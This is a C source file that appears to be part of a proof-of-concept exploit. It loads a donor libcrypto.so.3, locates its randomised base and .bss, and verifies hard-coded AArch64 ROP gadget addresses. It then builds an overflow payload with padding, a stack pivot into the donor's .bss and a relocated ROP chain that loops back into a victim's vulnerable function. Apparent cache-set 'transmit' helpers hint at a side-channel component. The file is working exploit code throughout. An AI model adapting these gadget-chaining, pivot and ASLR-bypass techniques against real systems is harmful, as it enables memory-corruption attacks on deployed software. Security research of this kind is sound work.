#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <libgen.h>
#include <dlfcn.h>
#include <link.h>
#include <elf.h>
#include "poc.h"
#include "donor.h"
#include "victim.h"

// The donor .so and ROP template ship in donor/ next to the binary. Resolve them from /proc/self/exe.
#define DONOR_SO   "donor/libcrypto.so.3"
#define DONOR_TMPL "donor/ovf_openssl_v3_template.bin"
#define VBASE 0x400000UL
#define VLEN  0x519000UL

static void exe_relative(char *out, size_t out_size, const char *rel) {
    char buf[PATH_MAX] = { 0 };
    ssize_t link_len = readlink("/proc/self/exe", buf, sizeof buf - 1);
    if (link_len <= 0) {
        printf("!! readlink /proc/self/exe\n");
        _exit(1);
    }
    buf[link_len] = 0;
    snprintf(out, out_size, "%s/%s", dirname(buf), rel);
}

static uint64_t g_vbase = 0, g_bss = 0, g_bssend = 0;
#define REL(x) ((uint64_t)(x) + (g_vbase - VBASE))

// gadget virtual addresses = VBASE + file offset (see the repo's gadget notes)
#define G_SETX0   0x4ef38cUL
#define G_DEREF   0x4f76d8UL
#define G_SETX19  0x4e39d0UL
#define G_AND     0x60d734UL
#define G_FLAGS   0x505218UL
#define G_CSEL    0x5acfb8UL
#define G_ADD     0x60efb0UL
#define G_STORE   0x503768UL
#define OPENER    0x6db14cUL
#define LDPX1920  0x6db154UL
#define GCARRY    0x60c370UL
#define MOVX1     0x6136a0UL
#define TAIL      0x50a21cUL
#define TAILA     0x50a244UL
#define PIVOT     0x529260UL
#define TRANS_BLR 0x50a224UL

RSA*     (*p_RSA_new)(void);
int      (*p_RSA_generate_key_ex)(RSA*, int, OBIGNUM*, void*);
void     (*p_RSA_get0_key)(const RSA*, const OBIGNUM**, const OBIGNUM**, const OBIGNUM**);
OBIGNUM* (*p_BN_new)(void);
int      (*p_BN_set_word)(OBIGNUM*, unsigned long);
char*    (*p_BN_bn2hex)(const OBIGNUM*);
int      (*p_BN_num_bits)(const OBIGNUM*);
EVP_PKEY*(*p_EVP_PKEY_new)(void);
int      (*p_EVP_PKEY_set1_RSA)(EVP_PKEY*, RSA*);
BN_CTX*  (*p_BN_CTX_new)(void);
int      (*p_BN_mod_exp)(OBIGNUM*, const OBIGNUM*, const OBIGNUM*, const OBIGNUM*, BN_CTX*);
OBIGNUM* (*p_BN_bin2bn)(const unsigned char*, int, OBIGNUM*);
int      (*p_BN_cmp)(const OBIGNUM*, const OBIGNUM*);
int      (*p_BN_bn2bin)(const OBIGNUM*, unsigned char*);

static void *g_dlh = NULL;

static int find_lib_cb(struct dl_phdr_info *info, size_t sz, void *arg) {
    (void)sz;
    (void)arg;
    if (!info->dlpi_name || !strstr(info->dlpi_name, "libcrypto.so.3")) {
        return 0;
    }
    g_vbase = info->dlpi_addr;
    for (int ph_index = 0; ph_index < info->dlpi_phnum; ++ph_index) {
        const ElfW(Phdr) *prog_header = &info->dlpi_phdr[ph_index];
        if (prog_header->p_type == PT_LOAD && (prog_header->p_flags & PF_W)) {
            uint64_t seg_addr = info->dlpi_addr + prog_header->p_vaddr;
            g_bss = seg_addr + prog_header->p_filesz;
            g_bssend = seg_addr + prog_header->p_memsz;
        }
    }
    return 1;
}

void load_donor(void) {
    char path[PATH_MAX] = { 0 };
    exe_relative(path, sizeof path, DONOR_SO);
    g_dlh = dlopen(path, RTLD_NOW | RTLD_GLOBAL);
    if (!g_dlh) {
        printf("!! dlopen: %s\n", dlerror());
        _exit(1);
    }
    dl_iterate_phdr(find_lib_cb, NULL);
    if (!g_vbase || !g_bss || g_bssend <= g_bss + 64) {
        printf("!! runtime base/.bss discovery failed\n");
        _exit(1);
    }
}

void resolve_syms(void) {
#define DLS(nm) do { p_##nm = (void*)dlsym(g_dlh, #nm); if (!p_##nm) { printf("!! dlsym %s\n", #nm); _exit(1); } } while (0)
    DLS(RSA_new);
    DLS(RSA_generate_key_ex);
    DLS(RSA_get0_key);
    DLS(BN_new);
    DLS(BN_set_word);
    DLS(BN_bn2hex);
    DLS(BN_num_bits);
    DLS(EVP_PKEY_new);
    DLS(EVP_PKEY_set1_RSA);
    DLS(BN_CTX_new);
    DLS(BN_mod_exp);
    DLS(BN_bin2bn);
    DLS(BN_cmp);
    DLS(BN_bn2bin);
#undef DLS
}

int verify_gadgets(void) {
    return !(*(uint32_t*)REL(G_SETX0) == 0xf9400fe0u && *(uint32_t*)REL(G_DEREF) == 0xf9400000u
          && *(uint32_t*)REL(G_SETX19) == 0xf9400bf3u && *(uint32_t*)REL(G_AND) == 0x8a130000u
          && *(uint32_t*)REL(G_FLAGS) == 0xf100001fu && *(uint32_t*)REL(G_CSEL) == 0x9a9f1260u
          && *(uint32_t*)REL(G_ADD) == 0x8b130000u && *(uint32_t*)REL(G_STORE) == 0xf9000260u
          && *(uint32_t*)REL(OPENER) == 0xf9400260u && *(uint32_t*)REL(GCARRY) == 0x38409401u
          && *(uint32_t*)REL(LDPX1920) == 0xa94153f3u && *(uint32_t*)REL(MOVX1) == 0xaa1303e1u
          && *(uint32_t*)REL(TAIL) == 0x54000141u && *(uint32_t*)REL(TAILA) == 0xf900027fu
          && *(uint32_t*)REL(PIVOT) == 0x910003bfu && *(uint32_t*)REL(TRANS_BLR) == 0xd63f0000u);
}

void donor_banner(void) {
    printf("donor dlopen'd @ %#lx (ASLR'd base), .bss %#lx..%#lx (%lu B)\n",
           g_vbase, g_bss, g_bssend, g_bssend - g_bss);
}

int donor_transmit_set(void)      { return SET_OF(REL(TRANS_BLR)); }
int donor_tail_set(void)          { return SET_OF(REL(TAIL)); }
int donor_transmit_line_off(void) { return TRANS_BLR & 0x3f; }

uint8_t *payload = NULL;

void build_payload(void) {
    char tpath[PATH_MAX] = { 0 };
    exe_relative(tpath, sizeof tpath, DONOR_TMPL);
    FILE *file = fopen(tpath, "rb");
    if (!file) {
        perror("open template");
        _exit(1);
    }
    fseek(file, 0, SEEK_END);
    long chain_len = ftell(file);
    fseek(file, 0, SEEK_SET);
    uint8_t *chain = malloc(chain_len);
    if (fread(chain, 1, chain_len, file) != (size_t)chain_len) {
        printf("!! template\n");
        _exit(1);
    }
    fclose(file);
    if (CHAIN_OFF + chain_len > PAYLEN) {
        printf("!! PAYLEN too small\n");
        _exit(1);
    }

    // The PIVOT anchors its stack at WT inside the donor's own .bss, so every ROP iteration reuses
    // an identical frame and the victim never drifts or crashes. [WT+8] loops back into call_vuln.
    uint64_t WT = (g_bss + 64) & ~0xFUL;
    if (WT + 2304 > g_bssend) {
        printf("!! donor .bss too small for pivot (%lu B)\n", g_bssend - g_bss);
        _exit(1);
    }
    *(uint64_t *)(WT + 8) = (uint64_t)&call_vuln;

    payload = calloc(1, PAYLEN);
    memset(payload, 0x41, CHAIN_OFF);
    *(uint64_t *)(payload + 0x40) = WT;
    memcpy(payload + CHAIN_OFF, chain, chain_len);
    uint64_t *words = (uint64_t *)(payload + CHAIN_OFF);
    for (long word_index = 0; word_index < chain_len / 8; ++word_index) {
        if (words[word_index] >= VBASE && words[word_index] < VBASE + VLEN) {   // relocate the template's libcrypto text addresses
            words[word_index] += (g_vbase - VBASE);
        }
    }
    *(uint64_t *)(payload + CHAIN_OFF + OFF_WT) = WT;
}
